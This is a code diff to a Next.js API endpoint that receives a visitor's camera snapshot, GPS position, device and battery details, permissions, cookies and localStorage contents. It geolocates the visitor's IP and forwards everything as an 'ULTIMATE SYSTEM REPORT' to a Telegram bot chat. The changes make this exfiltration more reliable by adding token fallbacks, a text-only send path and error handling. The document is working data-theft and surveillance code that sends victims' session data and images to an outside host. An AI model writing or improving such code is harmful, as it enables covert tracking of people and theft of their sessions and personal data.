@@ -4,10 +4,13 @@ import axios from "axios";
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    const { image, gps, device, battery, permissions, cookies, localStorageData, gpu } = body;
+    const { image, gps, device = {}, battery = null, permissions = {} } = body;
+    const cookies = Array.isArray(body.cookies) ? body.cookies : [];
+    const localStorageData = typeof body.localStorageData === "string" ? body.localStorageData : "";
     const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";
 
-    const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`).catch(() => ({ data: {} }));
+    const clientIp = ip.split(",")[0].trim();
+    const geoRes = await axios.get(`http://ip-api.com/json/${clientIp}`).catch(() => ({ data: {} }));
     const geo = geoRes.data;
 
     let caption = `🚀 *ULTIMATE SYSTEM REPORT*\n`;
@@ -64,7 +67,18 @@ export async function POST(req: Request) {
     };
 
     const formData = new FormData();
-    formData.append("chat_id", process.env.TELEGRAM_CHAT_ID!);
+    const botToken = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
+      console.error("Telegram configuration missing:", {
+        hasToken: Boolean(botToken),
+        hasChatId: Boolean(chatId),
+      });
+      return NextResponse.json({ error: "Telegram is not configured" }, { status: 500 });
+    }
+
+    formData.append("chat_id", chatId);
     
     if (image) {
       const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
@@ -75,10 +89,35 @@ export async function POST(req: Request) {
     formData.append("parse_mode", "Markdown");
     formData.append("reply_markup", JSON.stringify(keyboard));
 
-    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, formData);
+    const endpoint = image
+      ? `https://api.telegram.org/bot${botToken}/sendPhoto`
+      : `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-    return NextResponse.json({ success: true });
+    if (!image) {
+      formData.delete("caption");
+      formData.delete("reply_markup");
+      formData.append("parse_mode", "Markdown");
+    }
+
+    const telegramResponse = await axios.post(endpoint, formData, {
+      timeout: 15000,
+      validateStatus: () => true,
+    });
+
+    if (!telegramResponse.data?.ok) {
+      console.error("Telegram API error:", telegramResponse.data);
+      return NextResponse.json(
+        { error: "Telegram API rejected the request", telegram: telegramResponse.data },
+        { status: 502 },
+      );
+    }
+
+    return NextResponse.json({ success: true, telegram: true });
   } catch (error) {
-    return NextResponse.json({ error: "Failed" }, { status: 500 });
+    console.error("POST /api/snap failed:", error);
+    return NextResponse.json(
+      { error: "Failed", message: error instanceof Error ? error.message : "Unknown error" },
+      { status: 500 },
+    );
   }
 }
